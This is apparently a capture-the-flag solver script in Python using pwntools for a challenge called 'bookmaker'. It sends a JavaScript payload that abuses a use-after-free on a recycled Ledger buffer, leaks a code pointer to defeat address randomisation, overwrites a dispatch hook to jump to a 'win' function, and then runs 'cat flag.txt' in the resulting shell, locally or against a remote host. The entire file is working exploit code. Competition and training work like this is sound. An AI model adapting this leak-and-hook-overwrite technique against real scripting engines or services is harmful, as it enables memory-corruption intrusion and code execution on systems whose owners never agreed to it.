#!/usr/bin/env python3
from pwn import ELF, context, process, remote
import argparse
import os
import re
from pathlib import Path


context.log_level = os.environ.get("LOG", "info")

CHALLENGE_DIR = Path(__file__).resolve().parent
DEFAULT_BINARY = CHALLENGE_DIR / "dist" / "bookmaker"
DEFAULT_SYMBOLS = CHALLENGE_DIR / "build" / "bookmaker"
DEFAULT_COMMAND = "cat flag.txt\nexit\n"
SCRIPT_END_MARKER = "__END_MARKET_SCRIPT__\n"

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "1452"))
TIMEOUT = float(os.environ.get("TIMEOUT", "10"))


def build_script(reject_off: int, win_off: int, hook_off: int) -> str:
    return f"""
function load64(buf, off) {{
  let x = 0n;
  for (let i = 0; i < 8; i++) {{
    x |= BigInt(buf[off + i]) << (8n * BigInt(i));
  }}
  return x;
}}

function pack64(x) {{
  const out = new Uint8Array(8);
  for (let i = 0; i < 8; i++) {{
    out[i] = Number((x >> (8n * BigInt(i))) & 0xffn);
  }}
  return out;
}}

const ledger = new Ledger(0x30);
const stale = new Uint8Array(ledger.view());
ledger.recycle();
const wire = mintWire();

const base = load64(stale, 24) - {reject_off}n;
const hook = base + {hook_off}n;
const win = base + {win_off}n;

poke64(stale, 0, Number(hook));
poke64(stale, 8, 8);
wireWrite(wire, pack64(win));

settle("Tahmid finishes web five on time");
""".lstrip()


def connect(args):
    if args.remote:
        return remote(args.host, args.port, timeout=args.timeout)
    return process([str(args.binary.resolve())], cwd=str(CHALLENGE_DIR))


def solve(io, script: str, command: str) -> bytes:
    payload = script + SCRIPT_END_MARKER + command
    io.send(payload.encode())
    return io.recvrepeat(TIMEOUT)


def main() -> None:
    parser = argparse.ArgumentParser(description="solver for bookmaker")
    parser.add_argument("--remote", action="store_true", help="connect over tcp")
    parser.add_argument("--host", default=HOST, help="remote host")
    parser.add_argument("--port", type=int, default=PORT, help="remote port")
    parser.add_argument("--timeout", type=float, default=TIMEOUT, help="io timeout")
    parser.add_argument("--binary", type=Path, default=DEFAULT_BINARY, help="target binary")
    parser.add_argument("--symbols", type=Path, default=DEFAULT_SYMBOLS, help="unstripped symbol file")
    parser.add_argument("--command", default=DEFAULT_COMMAND, help="post-shell command")
    args = parser.parse_args()

    elf = ELF(str(args.symbols.resolve()), checksec=False)
    script = build_script(
        elf.symbols["reject_dispatch"],
        elf.symbols["win"],
        elf.symbols["dispatch_hook"],
    )

    io = connect(args)
    try:
        data = solve(io, script, args.command)
    finally:
        io.close()

    text = data.decode("latin-1", errors="replace")
    match = re.search(r"UMDCTF\{[^}\n]+\}", text)
    if match:
        print(match.group(0))
    else:
        print(text, end="")


if __name__ == "__main__":
    main()
